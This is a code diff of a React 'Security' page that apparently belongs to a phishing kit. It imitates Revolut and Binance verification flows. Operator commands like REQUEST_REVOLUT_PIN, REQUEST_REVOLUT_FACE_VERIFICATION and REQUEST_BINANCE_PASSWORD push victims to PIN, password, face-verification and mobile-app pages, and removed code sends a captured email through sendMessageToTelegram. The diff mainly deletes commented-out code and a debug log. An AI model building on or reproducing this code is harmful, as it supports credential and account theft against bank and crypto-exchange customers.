@@ -97,37 +97,17 @@ export default function Security() {
             displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PIN') {
             navigateWithLoader('/PasswordPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO PIN PAGE");
-            //     router.push('/PasswordPage');
-            // }, 3500);
         } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PIN");
             displayErrorModal('pin'); // Show error modal for pin
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
             navigateWithLoader('/FaceVerificationPage');
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
-            //     // displayPageLoader();
-            //     // router.push('/FaceVerificationPage');
-            // }, 3500);
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
             // displayErrorModal('face_verification'); // Show error modal for face verification
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
             displayAuthModal()
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
-            //     router.push('/MobileAuthPAge');
-            // }, 3500);
         } else if (command === 'FINISH') {
             navigateWithLoader('/verificationPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     resetCommand(); 
-            //     router.push('/verificationPage');
-            // }, 3500);
         }
     }, [command, router, commandCounter]);
 
@@ -191,32 +171,8 @@ export default function Security() {
     };
 
 
-    // Handle command changes
-    // useEffect(() => {
-    //     if (command === 'REQUEST_EMAIL_AGAIN') {
-    //         setInvalid(true); // Show error state for email input
-    //         setIsLoading(false);
-    //     } else if (command === 'REQUEST_BINANCE_PASSWORD') {
-    //         setIsLoading(false);
-    //         setTimeout(() => {
-    //             // setIsLoading(false);
-    //             router.push('/PasswordPage');
-    //         }, 500);
-    //     }
-    // }, [command]);
-
-    // const { validateEmail } = useValidateEmail();
-    // Handle email validation
-    // const handleEmailValidation = () => {
-    //     const isValid = validateEmail(email);
-    //     setInvalid(!isValid);
-    //     setIsLoading(true);
-    //     setUserEmail(email);
-    //     sendMessageToTelegram(email);
-    // };
 
 
-    console.log("MobileAuthModal props: in password page is ", { displayAuth, setDisplayAuth: typeof setDisplayAuth, resetCommand: typeof resetCommand });
     const stableSetDisplayAuth = useCallback(
         (value) => setDisplayAuth(value),
         [] // Empty dependency = never changes
